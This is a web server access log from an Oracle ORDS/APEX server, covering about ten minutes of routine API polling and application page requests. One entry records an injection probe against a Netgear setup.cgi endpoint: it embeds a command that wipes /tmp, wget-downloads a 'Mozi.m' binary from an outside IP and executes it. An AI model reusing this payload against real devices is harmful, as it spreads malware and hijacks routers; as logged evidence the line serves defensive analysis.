46.146.210.91 - - [01/Dec/2022:00:22:25 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:12:24&vEND_DT=01.12.2022%2000:22:24 HTTP/1.1" 200 32086
195.222.149.195 - - [01/Dec/2022:00:22:32 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:14:04&vEND_DT=30.11.2022%2022:24:04 HTTP/1.1" 200 68474
46.146.210.91 - - [01/Dec/2022:00:22:35 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:12:34&vEND_DT=01.12.2022%2000:22:34 HTTP/1.1" 200 30562
195.222.149.195 - - [01/Dec/2022:00:22:43 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:14:14&vEND_DT=30.11.2022%2022:24:14 HTTP/1.1" 200 71519
46.146.210.91 - - [01/Dec/2022:00:22:45 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:12:44&vEND_DT=01.12.2022%2000:22:44 HTTP/1.1" 200 30562
195.222.149.195 - - [01/Dec/2022:00:22:53 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:14:24&vEND_DT=30.11.2022%2022:24:24 HTTP/1.1" 200 73033
46.146.210.91 - - [01/Dec/2022:00:22:55 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:12:54&vEND_DT=01.12.2022%2000:22:54 HTTP/1.1" 200 30562
195.222.149.195 - - [01/Dec/2022:00:23:03 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:14:34&vEND_DT=30.11.2022%2022:24:34 HTTP/1.1" 200 73033
46.146.210.91 - - [01/Dec/2022:00:23:05 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:13:04&vEND_DT=01.12.2022%2000:23:04 HTTP/1.1" 200 30562
195.222.149.195 - - [01/Dec/2022:00:23:12 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:14:44&vEND_DT=30.11.2022%2022:24:44 HTTP/1.1" 200 74555
46.146.210.91 - - [01/Dec/2022:00:23:15 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:13:14&vEND_DT=01.12.2022%2000:23:14 HTTP/1.1" 200 30562
195.222.149.195 - - [01/Dec/2022:00:23:22 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:14:54&vEND_DT=30.11.2022%2022:24:54 HTTP/1.1" 200 74555
46.146.210.91 - - [01/Dec/2022:00:23:25 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:13:24&vEND_DT=01.12.2022%2000:23:24 HTTP/1.1" 200 28106
195.222.149.195 - - [01/Dec/2022:00:23:33 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:15:04&vEND_DT=30.11.2022%2022:25:04 HTTP/1.1" 200 74555
46.146.210.91 - - [01/Dec/2022:00:23:35 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:13:34&vEND_DT=01.12.2022%2000:23:34 HTTP/1.1" 200 26589
195.222.149.195 - - [01/Dec/2022:00:23:42 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:15:14&vEND_DT=30.11.2022%2022:25:14 HTTP/1.1" 200 71586
46.146.210.91 - - [01/Dec/2022:00:23:45 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:13:44&vEND_DT=01.12.2022%2000:23:44 HTTP/1.1" 200 26589
195.222.149.195 - - [01/Dec/2022:00:23:53 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:15:24&vEND_DT=30.11.2022%2022:25:24 HTTP/1.1" 200 70070
46.146.210.91 - - [01/Dec/2022:00:23:55 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:13:54&vEND_DT=01.12.2022%2000:23:54 HTTP/1.1" 200 26589
195.222.149.195 - - [01/Dec/2022:00:24:05 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:15:34&vEND_DT=30.11.2022%2022:25:34 HTTP/1.1" 200 70070
46.146.210.91 - - [01/Dec/2022:00:24:05 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:14:04&vEND_DT=01.12.2022%2000:24:04 HTTP/1.1" 200 26589
94.51.211.239 - - [01/Dec/2022:00:24:08 +0500] "POST /ords/wwv_flow.ajax HTTP/1.1" 200 38613
46.146.210.91 - - [01/Dec/2022:00:24:15 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:14:14&vEND_DT=01.12.2022%2000:24:14 HTTP/1.1" 200 30033
46.146.210.91 - - [01/Dec/2022:00:24:25 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:14:24&vEND_DT=01.12.2022%2000:24:24 HTTP/1.1" 200 30033
94.51.211.239 - - [01/Dec/2022:00:24:34 +0500] "POST /ords/wwv_flow.ajax HTTP/1.1" 200 23641
46.146.210.91 - - [01/Dec/2022:00:24:35 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:14:34&vEND_DT=01.12.2022%2000:24:34 HTTP/1.1" 200 31966
46.146.210.91 - - [01/Dec/2022:00:24:45 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:14:44&vEND_DT=01.12.2022%2000:24:44 HTTP/1.1" 200 31966
46.146.210.91 - - [01/Dec/2022:00:24:56 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:14:54&vEND_DT=01.12.2022%2000:24:54 HTTP/1.1" 200 30443
58.136.58.22 - - [01/Dec/2022:00:25:05 +0500] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.136.58.227:57002/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 1012
46.146.210.91 - - [01/Dec/2022:00:25:08 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:15:04&vEND_DT=01.12.2022%2000:25:04 HTTP/1.1" 200 30443
94.51.211.239 - - [01/Dec/2022:00:25:14 +0500] "GET /ords/f?p=147:2:11876333479912::NO::P2_ID,P2_COUNT_ALL,P2_EDIT_MODE:113905,3, HTTP/1.1" 200 102322
46.146.210.91 - - [01/Dec/2022:00:25:16 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:15:14&vEND_DT=01.12.2022%2000:25:14 HTTP/1.1" 200 30443
195.222.149.195 - - [01/Dec/2022:00:25:29 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:15:44&vEND_DT=30.11.2022%2022:25:44 HTTP/1.1" 200 70070
195.222.149.195 - - [01/Dec/2022:00:25:36 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=23.11.2022%2022:25:18&vEND_DT=30.11.2022%2022:25:18 HTTP/1.1" 500 12951
46.146.210.91 - - [01/Dec/2022:00:25:37 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:15:34&vEND_DT=01.12.2022%2000:25:34 HTTP/1.1" 200 28929
195.222.149.195 - - [01/Dec/2022:00:25:38 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:17:05&vEND_DT=30.11.2022%2022:27:05 HTTP/1.1" 200 78902
195.222.149.195 - - [01/Dec/2022:00:25:46 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:17:15&vEND_DT=30.11.2022%2022:27:15 HTTP/1.1" 200 78902
94.51.211.239 - - [01/Dec/2022:00:25:47 +0500] "POST /ords/wwv_flow.accept HTTP/1.1" 302 5
195.222.149.195 - - [01/Dec/2022:00:25:53 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:17:25&vEND_DT=30.11.2022%2022:27:25 HTTP/1.1" 200 80416
46.146.210.91 - - [01/Dec/2022:00:25:55 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:15:54&vEND_DT=01.12.2022%2000:25:54 HTTP/1.1" 200 26222
195.222.149.195 - - [01/Dec/2022:00:26:05 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:17:35&vEND_DT=30.11.2022%2022:27:35 HTTP/1.1" 200 75852
46.146.210.91 - - [01/Dec/2022:00:26:06 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:16:04&vEND_DT=01.12.2022%2000:26:04 HTTP/1.1" 200 24703
94.51.211.239 - - [01/Dec/2022:00:26:10 +0500] "GET /ords/f?p=147:2:11876333479912::::: HTTP/1.1" 200 102135
195.222.149.195 - - [01/Dec/2022:00:26:13 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:17:45&vEND_DT=30.11.2022%2022:27:45 HTTP/1.1" 200 72896
195.222.149.195 - - [01/Dec/2022:00:26:14 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=29.11.2022%2022:25:41&vEND_DT=30.11.2022%2022:25:41 HTTP/1.1" 500 12951
46.146.210.91 - - [01/Dec/2022:00:26:15 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:16:14&vEND_DT=01.12.2022%2000:26:14 HTTP/1.1" 200 24703
195.222.149.195 - - [01/Dec/2022:00:26:22 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:17:55&vEND_DT=30.11.2022%2022:27:55 HTTP/1.1" 200 72395
46.146.210.91 - - [01/Dec/2022:00:26:25 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:16:24&vEND_DT=01.12.2022%2000:26:24 HTTP/1.1" 200 24703
195.222.149.195 - - [01/Dec/2022:00:26:32 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:18:05&vEND_DT=30.11.2022%2022:28:05 HTTP/1.1" 200 72395
46.146.210.91 - - [01/Dec/2022:00:26:35 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:16:34&vEND_DT=01.12.2022%2000:26:34 HTTP/1.1" 200 24703
195.222.149.195 - - [01/Dec/2022:00:26:42 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:18:15&vEND_DT=30.11.2022%2022:28:15 HTTP/1.1" 200 69686
94.51.211.239 - - [01/Dec/2022:00:26:43 +0500] "POST /ords/wwv_flow.show HTTP/1.1" 200 53
46.146.210.91 - - [01/Dec/2022:00:26:45 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:16:44&vEND_DT=01.12.2022%2000:26:44 HTTP/1.1" 200 23183
195.222.149.195 - - [01/Dec/2022:00:26:52 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:18:25&vEND_DT=30.11.2022%2022:28:25 HTTP/1.1" 200 69686
46.146.210.91 - - [01/Dec/2022:00:26:55 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:16:54&vEND_DT=01.12.2022%2000:26:54 HTTP/1.1" 200 23183
94.51.211.239 - - [01/Dec/2022:00:27:04 +0500] "GET /ords/wwv_flow.show?p_request=APPLICATION_PROCESS%3DGET_SQL_RESULT&p_flow_id=555&p_flow_step_id=0&p_instance=11876333479912&p_arg_names=F_APPLICATION_ID&p_arg_values=147&p_arg_names=F_FILTER_TEXT&p_arg_values=&p_arg_names=F_LOV_NAME&p_arg_values=2_%D0%A1%D0%A2%D0%90%D0%A2%D0%A3%D0%A1%D0%AB_%D0%9C%D0%9E&p_arg_names=F_FILTER_TEXT2&p_arg_values=&p_arg_names=F_RESULT_COUNT&p_arg_values=50 HTTP/1.1" 200 296
195.222.149.195 - - [01/Dec/2022:00:27:04 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:18:35&vEND_DT=30.11.2022%2022:28:35 HTTP/1.1" 200 66988
94.51.211.239 - - [01/Dec/2022:00:27:05 +0500] "GET /ords/wwv_flow.show?p_request=APPLICATION_PROCESS%3DGET_SQL_RESULT&p_flow_id=555&p_flow_step_id=0&p_instance=11876333479912&p_arg_names=F_APPLICATION_ID&p_arg_values=147&p_arg_names=F_FILTER_TEXT&p_arg_values=&p_arg_names=F_LOV_NAME&p_arg_values=2_%D0%A1%D0%A2%D0%90%D0%A2%D0%A3%D0%A1%D0%AB_%D0%9C%D0%9E&p_arg_names=F_FILTER_TEXT2&p_arg_values=&p_arg_names=F_RESULT_COUNT&p_arg_values=50 HTTP/1.1" 200 296
94.51.211.239 - - [01/Dec/2022:00:27:05 +0500] "GET /ords/r/r/files/static/v74Y/ui-anim_basic_16x16.gif HTTP/1.1" 404 5
94.51.211.239 - - [01/Dec/2022:00:27:05 +0500] "GET /ords/r/r/files/static/v74Y/ui-anim_basic_16x16.gif HTTP/1.1" 404 -
46.146.210.91 - - [01/Dec/2022:00:27:07 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:17:04&vEND_DT=01.12.2022%2000:27:04 HTTP/1.1" 200 23183
195.222.149.195 - - [01/Dec/2022:00:27:12 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:18:45&vEND_DT=30.11.2022%2022:28:45 HTTP/1.1" 200 66988
46.146.210.91 - - [01/Dec/2022:00:27:15 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:17:14&vEND_DT=01.12.2022%2000:27:14 HTTP/1.1" 200 27651
195.222.149.195 - - [01/Dec/2022:00:27:22 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:18:55&vEND_DT=30.11.2022%2022:28:55 HTTP/1.1" 200 70033
46.146.210.91 - - [01/Dec/2022:00:27:25 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:17:24&vEND_DT=01.12.2022%2000:27:24 HTTP/1.1" 200 26135
195.222.149.195 - - [01/Dec/2022:00:27:32 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:19:05&vEND_DT=30.11.2022%2022:29:05 HTTP/1.1" 200 66983
46.146.210.91 - - [01/Dec/2022:00:27:35 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:17:34&vEND_DT=01.12.2022%2000:27:34 HTTP/1.1" 200 24599
195.222.149.195 - - [01/Dec/2022:00:27:43 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:19:15&vEND_DT=30.11.2022%2022:29:15 HTTP/1.1" 200 63945
46.146.210.91 - - [01/Dec/2022:00:27:45 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:17:44&vEND_DT=01.12.2022%2000:27:44 HTTP/1.1" 200 21911
195.222.149.195 - - [01/Dec/2022:00:27:52 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:19:25&vEND_DT=30.11.2022%2022:29:25 HTTP/1.1" 200 60898
46.146.210.91 - - [01/Dec/2022:00:27:55 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:17:54&vEND_DT=01.12.2022%2000:27:54 HTTP/1.1" 200 21911
195.222.149.195 - - [01/Dec/2022:00:28:02 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:19:35&vEND_DT=30.11.2022%2022:29:35 HTTP/1.1" 200 59719
46.146.210.91 - - [01/Dec/2022:00:28:05 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:18:04&vEND_DT=01.12.2022%2000:28:04 HTTP/1.1" 200 20393
195.222.149.195 - - [01/Dec/2022:00:28:12 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:19:45&vEND_DT=30.11.2022%2022:29:45 HTTP/1.1" 200 55168
46.146.210.91 - - [01/Dec/2022:00:28:15 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:18:14&vEND_DT=01.12.2022%2000:28:14 HTTP/1.1" 200 20393
195.222.149.195 - - [01/Dec/2022:00:28:22 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:19:55&vEND_DT=30.11.2022%2022:29:55 HTTP/1.1" 200 55168
46.146.210.91 - - [01/Dec/2022:00:28:25 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:18:24&vEND_DT=01.12.2022%2000:28:24 HTTP/1.1" 200 20393
195.222.149.195 - - [01/Dec/2022:00:28:32 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:20:05&vEND_DT=30.11.2022%2022:30:05 HTTP/1.1" 200 53655
46.146.210.91 - - [01/Dec/2022:00:28:38 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:18:34&vEND_DT=01.12.2022%2000:28:34 HTTP/1.1" 200 20393
195.222.149.195 - - [01/Dec/2022:00:28:43 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:20:15&vEND_DT=30.11.2022%2022:30:15 HTTP/1.1" 200 52138
46.146.210.91 - - [01/Dec/2022:00:28:45 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:18:44&vEND_DT=01.12.2022%2000:28:44 HTTP/1.1" 200 18868
195.222.149.195 - - [01/Dec/2022:00:28:52 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:20:25&vEND_DT=30.11.2022%2022:30:25 HTTP/1.1" 200 52138
46.146.210.91 - - [01/Dec/2022:00:28:55 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:18:54&vEND_DT=01.12.2022%2000:28:54 HTTP/1.1" 200 17354
195.222.149.195 - - [01/Dec/2022:00:29:02 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:20:35&vEND_DT=30.11.2022%2022:30:35 HTTP/1.1" 200 53653
46.146.210.91 - - [01/Dec/2022:00:29:05 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:19:04&vEND_DT=01.12.2022%2000:29:04 HTTP/1.1" 200 17354
195.222.149.195 - - [01/Dec/2022:00:29:12 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:20:45&vEND_DT=30.11.2022%2022:30:45 HTTP/1.1" 200 53653
46.146.210.91 - - [01/Dec/2022:00:29:15 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:19:14&vEND_DT=01.12.2022%2000:29:14 HTTP/1.1" 200 17354
195.222.149.195 - - [01/Dec/2022:00:29:23 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:20:55&vEND_DT=30.11.2022%2022:30:55 HTTP/1.1" 200 53653
46.146.210.91 - - [01/Dec/2022:00:29:25 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:19:24&vEND_DT=01.12.2022%2000:29:24 HTTP/1.1" 200 17354
195.222.149.195 - - [01/Dec/2022:00:29:32 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:21:05&vEND_DT=30.11.2022%2022:31:05 HTTP/1.1" 200 53653
46.146.210.91 - - [01/Dec/2022:00:29:35 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:19:34&vEND_DT=01.12.2022%2000:29:34 HTTP/1.1" 200 17354
195.222.149.195 - - [01/Dec/2022:00:29:43 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:21:15&vEND_DT=30.11.2022%2022:31:15 HTTP/1.1" 200 52138
46.146.210.91 - - [01/Dec/2022:00:29:45 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:19:44&vEND_DT=01.12.2022%2000:29:44 HTTP/1.1" 200 17354
94.51.211.239 - - [01/Dec/2022:00:29:50 +0500] "POST /ords/wwv_flow.show HTTP/1.1" 200 1568970
195.222.149.195 - - [01/Dec/2022:00:29:52 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:21:25&vEND_DT=30.11.2022%2022:31:25 HTTP/1.1" 200 49432
46.146.210.91 - - [01/Dec/2022:00:29:55 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:19:54&vEND_DT=01.12.2022%2000:29:54 HTTP/1.1" 200 17354
195.222.149.195 - - [01/Dec/2022:00:30:05 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:21:35&vEND_DT=30.11.2022%2022:31:35 HTTP/1.1" 200 52462
46.146.210.91 - - [01/Dec/2022:00:30:06 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:20:04&vEND_DT=01.12.2022%2000:30:04 HTTP/1.1" 200 11437
195.222.149.195 - - [01/Dec/2022:00:30:13 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:21:45&vEND_DT=30.11.2022%2022:31:45 HTTP/1.1" 200 52462
46.146.210.91 - - [01/Dec/2022:00:30:15 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:20:14&vEND_DT=01.12.2022%2000:30:14 HTTP/1.1" 200 14467
195.222.149.195 - - [01/Dec/2022:00:30:22 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:21:55&vEND_DT=30.11.2022%2022:31:55 HTTP/1.1" 200 50950
46.146.210.91 - - [01/Dec/2022:00:30:25 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:20:24&vEND_DT=01.12.2022%2000:30:24 HTTP/1.1" 200 14467
94.51.211.239 - - [01/Dec/2022:00:30:31 +0500] "POST /ords/wwv_flow.show HTTP/1.1" 200 12
195.222.149.195 - - [01/Dec/2022:00:30:33 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:22:05&vEND_DT=30.11.2022%2022:32:05 HTTP/1.1" 200 50950
46.146.210.91 - - [01/Dec/2022:00:30:35 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:20:34&vEND_DT=01.12.2022%2000:30:34 HTTP/1.1" 200 22002
94.51.211.239 - - [01/Dec/2022:00:30:40 +0500] "POST /ords/wwv_flow.accept HTTP/1.1" 302 5
195.222.149.195 - - [01/Dec/2022:00:30:42 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:22:15&vEND_DT=30.11.2022%2022:32:15 HTTP/1.1" 200 49435
46.146.210.91 - - [01/Dec/2022:00:30:45 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:20:44&vEND_DT=01.12.2022%2000:30:44 HTTP/1.1" 200 22002
195.222.149.195 - - [01/Dec/2022:00:30:54 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:22:25&vEND_DT=30.11.2022%2022:32:25 HTTP/1.1" 200 47913
46.146.210.91 - - [01/Dec/2022:00:30:56 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:20:54&vEND_DT=01.12.2022%2000:30:54 HTTP/1.1" 200 22002
195.222.149.195 - - [01/Dec/2022:00:31:04 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:22:35&vEND_DT=30.11.2022%2022:32:35 HTTP/1.1" 200 43942
94.51.211.239 - - [01/Dec/2022:00:31:07 +0500] "GET /ords/f?p=147:2:11876333479912:::::&success_msg=xODt7fvlIOjn7OXt5e37Lg%7E%7E%2FoM0bXkdPHlszlWP5aN8eOhmDoKSEoirRu3rNGQHXonjf59fdd-LjqXwv7MRUAIWljLUN2ZBEeu0_fvJe11ByFw HTTP/1.1" 200 104089
195.222.149.195 - - [01/Dec/2022:00:31:13 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:22:45&vEND_DT=30.11.2022%2022:32:45 HTTP/1.1" 200 42418
46.146.210.91 - - [01/Dec/2022:00:31:15 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:21:14&vEND_DT=01.12.2022%2000:31:14 HTTP/1.1" 200 22002
195.222.149.195 - - [01/Dec/2022:00:31:23 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:22:55&vEND_DT=30.11.2022%2022:32:55 HTTP/1.1" 200 38201
94.51.211.239 - - [01/Dec/2022:00:31:24 +0500] "GET /ords/f?p=147:2:11876333479912::NO::P2_ID,P2_COUNT_ALL,P2_EDIT_MODE:113904,5, HTTP/1.1" 200 103477
94.51.211.239 - - [01/Dec/2022:00:31:25 +0500] "GET /ords/f?p=147:2:11876333479912::NO::P2_ID,P2_COUNT_ALL,P2_EDIT_MODE:113876,3, HTTP/1.1" 200 102474
94.51.211.239 - - [01/Dec/2022:00:31:27 +0500] "GET /ords/f?p=147:2:11876333479912::NO::P2_ID,P2_COUNT_ALL,P2_EDIT_MODE:113875,3, HTTP/1.1" 200 102476
195.222.149.195 - - [01/Dec/2022:00:31:33 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:23:05&vEND_DT=30.11.2022%2022:33:05 HTTP/1.1" 200 38201
195.222.149.195 - - [01/Dec/2022:00:31:43 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:23:15&vEND_DT=30.11.2022%2022:33:15 HTTP/1.1" 200 38201
195.222.149.195 - - [01/Dec/2022:00:31:53 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:23:25&vEND_DT=30.11.2022%2022:33:25 HTTP/1.1" 200 38201
195.222.149.195 - - [01/Dec/2022:00:32:04 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:23:35&vEND_DT=30.11.2022%2022:33:35 HTTP/1.1" 200 35746
46.146.210.91 - - [01/Dec/2022:00:32:06 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:22:04&vEND_DT=01.12.2022%2000:32:04 HTTP/1.1" 200 18965
195.222.149.195 - - [01/Dec/2022:00:32:13 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:23:45&vEND_DT=30.11.2022%2022:33:45 HTTP/1.1" 200 31524
46.146.210.91 - - [01/Dec/2022:00:32:15 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=01.12.2022%2000:22:14&vEND_DT=01.12.2022%2000:32:14 HTTP/1.1" 200 18965
195.222.149.195 - - [01/Dec/2022:00:32:23 +0500] "GET /ords/api.HTP_ASPVK_DATA?nPVK_ID=0&vST_DT=30.11.2022%2022:23:55&vEND_DT=30.11.2022%2022:33:55 HTTP/1.1" 200 31524
